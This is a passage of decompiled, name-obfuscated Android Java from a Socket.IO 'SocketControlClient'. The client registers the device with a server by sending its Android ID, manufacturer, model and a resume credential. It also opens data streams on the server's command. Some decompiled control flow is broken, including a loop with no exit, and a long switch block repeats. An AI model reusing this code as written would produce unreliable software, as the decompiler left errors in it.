                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i9, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar10 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar10), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i10 = 0;
                                int i11 = 0;
                                bArr = null;
                                while (true) {
                                    if (i10 < length) {
                                        Object obj3 = objArr[i10];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i11++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i10++;
                                    } else if (i11 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i9 = 6;
            sVarA.c("heartbeat:ack", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i9) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i10 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i10, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar10 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar10), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i10, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar11 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar11), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i11 = 0;
                                int i12 = 0;
                                bArr = null;
                                while (true) {
                                    if (i11 < length) {
                                        Object obj3 = objArr[i11];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i12++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i11++;
                                    } else if (i12 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
